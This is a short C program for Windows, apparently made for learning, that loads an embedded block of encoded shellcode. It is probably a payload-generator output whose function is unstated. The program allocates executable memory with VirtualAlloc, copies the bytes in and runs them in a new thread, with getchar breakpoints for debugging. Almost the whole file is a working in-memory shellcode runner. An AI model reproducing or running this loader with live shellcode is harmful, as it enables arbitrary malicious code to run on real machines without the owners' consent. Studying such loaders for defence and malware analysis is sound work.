// https://www.youtube.com/watch?v=6g8w1MSz9xA&ab_channel=ActiveXSploit

#include <windows.h>
#include <stdio.h>

int main(){
	
	unsigned char shellcode[] = 
	"\xbf\x87\x3c\x1a\x09\xd9\xcb\xd9\x74\x24\xf4\x5a\x33\xc9"
	"\xb1\x34\x83\xea\xfc\x31\x7a\x0f\x03\x7a\x88\xde\xef\xf5"
	"\x7e\x9c\x10\x06\x7e\xc1\x99\xe3\x4f\xc1\xfe\x60\xff\xf1"
	"\x75\x24\xf3\x7a\xdb\xdd\x80\x0f\xf4\xd2\x21\xa5\x22\xdc"
	"\xb2\x96\x17\x7f\x30\xe5\x4b\x5f\x09\x26\x9e\x9e\x4e\x5b"
	"\x53\xf2\x07\x17\xc6\xe3\x2c\x6d\xdb\x88\x7e\x63\x5b\x6c"
	"\x36\x82\x4a\x23\x4d\xdd\x4c\xc5\x82\x55\xc5\xdd\xc7\x50"
	"\x9f\x56\x33\x2e\x1e\xbf\x0a\xcf\x8d\xfe\xa3\x22\xcf\xc7"
	"\x03\xdd\xba\x31\x70\x60\xbd\x85\x0b\xbe\x48\x1e\xab\x35"
	"\xea\xfa\x4a\x99\x6d\x88\x40\x56\xf9\xd6\x44\x69\x2e\x6d"
	"\x70\xe2\xd1\xa2\xf1\xb0\xf5\x66\x5a\x62\x97\x3f\x06\xc5"
	"\xa8\x20\xe9\xba\x0c\x2a\x07\xae\x3c\x71\x4d\x31\xb2\x0f"
	"\x23\x31\xcc\x0f\x13\x5a\xfd\x84\xfc\x1d\x02\x4f\xb9\xd2"
	"\x48\xd2\xeb\x7a\x15\x86\xae\xe6\xa6\x7c\xec\x1e\x25\x75"
	"\x8c\xe4\x35\xfc\x89\xa1\xf1\xec\xe3\xba\x97\x12\x50\xba"
	"\xbd\x64\x3f\x2a\x4d\xe4\xdc\xd9\x9c\x8e\x41\x6e\xf2\x56"
	"\xb1\xba\x34\x89\xdc\xba\x21\xd5";

	printf("shellcode variable address: 0x%p\n", (void*)shellcode);
	
    getchar(); //breakpoint for debugging
	
	int shellcode_size = sizeof(shellcode);
	void *exec_mem = NULL; // Allocated memory
	
	exec_mem = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Allocate memory with privs
	if (exec_mem == NULL) {
		printf("VirtualAlloc failed with error code: %lu\n", GetLastError());
		return 1;
	}

	printf("exec_mem region: 0x%p\n", (void*)exec_mem);
	
	getchar(); //breakpoint for debugging
	
	RtlMoveMemory(exec_mem, shellcode, shellcode_size); //Move the shellcode to allocated region
	
    HANDLE thread_handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (thread_handle == NULL) {
        printf("CreateThread failed: %d\n", GetLastError());
        return 1;
    }

    // Wait for the thread to complete
    WaitForSingleObject(thread_handle, INFINITE);

    // Close the thread handle
    CloseHandle(thread_handle);

    getchar();
	
	
	return 0;
}